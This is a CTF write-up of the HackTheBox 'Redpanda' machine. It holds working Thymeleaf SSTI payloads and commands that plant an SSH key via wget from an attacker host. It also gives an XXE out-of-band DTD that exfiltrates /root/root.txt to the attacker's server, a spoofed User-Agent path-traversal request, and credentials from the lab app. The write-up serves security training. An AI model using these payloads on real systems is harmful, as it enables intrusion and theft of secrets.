---
title: "HackTheBox: \"Redpanda\" Walkthrough"
date: 2022-07-10T15:10:02+02:00
tags: ['hackthebox', 'ctf']
categories: ["HackTheBox Walkthrough"]
slug: "hackthebox-redpanda-walkthrough"
draft: true
---

This machine is listed as an "easy" machine - but I found it to be harder than some
"medium" difficulty machines. The used techniques (SSTI, XXE) were not something special,
but they were not completely straight-forward.<!--more-->

# Enumeration

A port scan reveals an open SSH and HTTP server - the latter on port 8080.
Opening the webpage on port 8080, we are greeted with, well, a red panda
and a search mask. Just hinting enter displays a page which shows, among other things, the following text:

> Greg is a hacker. Watch out for his injection attacks!

Furthermore, we note the title of the website:

> Red Panda Search | Made with Spring Boot

Those are pretty big clues.

# User

Using [sqlmap](https://sqlmap.org/), we can get an idea if some application is vulnerable to SQL injection.
In this case, the result was negative, so let's move on to another injection technique: SSTI.
We put an expression in the search field: `${1+1}` (we assume the template engine used is Thymeleaf, because
it's quite popular in the Java world):

> You searched for: Error occured: banned characters

Ok, so it's not *that* easy. The `$` character and a few more are filtered.
Luckily, there are [more ways to achieve SSTI](https://www.acunetix.com/blog/web-security-zone/exploiting-ssti-in-thymeleaf/)
and someone made an [SSTI payload builder](https://github.com/VikasVarshney/ssti-payload).
We can use the payload builder and replace the `$` with an `*`, which is not filered by the application.

Thus, the payload to run the `id` command is:
```
*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(
    T(java.lang.Character).toString(105).concat(T(java.lang.Character).toString(100))).getInputStream())}
```

Which returns:

> You searched for: uid=1000(woodenk) gid=1001(logs) groups=1001(logs),1000(woodenk)

We generate the following payloads and send them via the search form, after which
we will have SSH access:
```
wget http://10.10.14.32:8000/pubkey -O /home/woodenk/.ssh/authorized_keys
chmod 600 /home/woodenk/.ssh/authorized_keys
chmod 700 /home/woodenk/.ssh
```

*Note:* Later we will be able to see the sources for the application - the part responsible for the SSTI is (see *expression preprocessing*):
```html
<h2 th:unless="${query} == Null" th:text="${'You searched for: '} + @{__${query}__}" class="searched"></h2>
```

# Root

Running `pspy` quickly reveals a pretty interesting cronjob:
```
2022/07/09 21:26:01 CMD: UID=0    PID=64413  | java -jar /opt/credit-score/LogParser/final/target/final-1.0-jar-with-dependencies.jar
2022/07/09 21:26:01 CMD: UID=0    PID=64412  | /bin/sh /root/run_credits.sh
2022/07/09 21:26:01 CMD: UID=0    PID=64411  | /bin/sh -c /root/run_credits.sh
```

We can find the full source for this JAR file (otherwise it would be easy to decompile it),
and it does the following:
1. Read `/opt/panda_search/redpanda.log` line by line
2. Split each line at `||`, extract the fields (in this order): status_code, ip, user_agent, uri
3. Use the value of `uri` to open this image: `String fullpath = "/opt/panda_search/src/main/resources/static" + uri;`
4. Try to read the "Artist" metadata field
5. Assemble another filename: `String xmlPath = "/credits/" + artist + "_creds.xml";`
6. Open this file using SAXBuilder, read it, increase some counters, write it back

What can we do now?
1. We can use the `User-Agent` HTTP header to overwrite the value for `uri`
2. Thus, we can make the application read an arbitrary image file
3. We can modify the metadata of this image so the application reads/writes an XML file of our choice

The first idea was that maybe the [library used to read the metadata](https://github.com/drewnoakes/metadata-extractor)
has some vulnerability. I already finished another machine were it was possible to get RCE via image metadata fields,
but after some research it was clear that this library has no known exploit.

Before running `pspy`, I also ran LinPEAS which brought my attention to an MySQL server.
Grepping through the sources, we can find the credentials:
```java
DriverManager.getConnection("jdbc:mysql://localhost:3306/red_panda", "woodenk", "RedPandazRule");
```
But the machine has the latest version of MySQL server running, again with no
known exploits. Looking through the databases and tables, we find nothing
of interest - just some data the web application is using.

So the **only** vector remaining is the XML parsing. When talking about XML, [XML External Entity (XXE)](https://owasp.org/www-community/vulnerabilities/XML_External_Entity_%28XXE%29_Processing) should come to mind.
I've not done XXE before, so it was not immediately clear how this could help us.
We can have the application (which runs as root) read *any* file, but then what?
How can we *exfiltrate* this data?

Are we still on the right track? Maybe there was a recent exploit for SAXBuilder, which
could give us an easy RCE? After a short research we could rule this out. Maybe XXE
can do something more powerful?

## Using XXE to exfiltrate secrets

Turns out: It can! ["Exploiting blind XXE to exfiltrate data out-of-band"](https://portswigger.net/web-security/xxe/blind)
sounds exactly like what we need, although it requires another step (and at this point I no longer think this machine should be rated "easy").
Let's assemble everything we need:

Use `exiftool` to modify the "Artist" field and upload this to the Redpanda machine
into the home directory of the user:
```
exiftool -artist='../home/woodenk/test' greg.jpg
```

Create a custom `.dtd` file (on our machine):
```xml
<!ENTITY % file SYSTEM "file:///root/root.txt">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://10.10.14.32:8000/?x=%file;'>">
%eval;
%exfiltrate;
```

Create a custom `.xml` file on the Redpanda machine (the filename must end with
`_creds.xml`, so with the "Artist" field we set above the application will
then read `/credits/../home/woodenk/test_creds.xml`):
```xml
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM
"http://10.10.14.32:8000/pwn.dtd"> %xxe;]>
```

Send a request which will spoof a log-entry so the "credit collector" picks
up our modified image file:
```
curl 'http://redpanda.htb:8080/img/greg.jpg' -H 'User-Agent: .jpg||/../../../../../../../../home/woodenk/greg.jpg'
```

Once the cronjob runs, we will see the following log entries on a HTTP server
started on our machine:
```sh
$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.129.195.213 - - [09/Jul/2022 19:18:13] "GET /pwn.dtd HTTP/1.1" 200 -
10.129.195.213 - - [09/Jul/2022 19:18:13] "GET /?x=<flag> HTTP/1.1" 200 -
```

We exfiltrated the flag!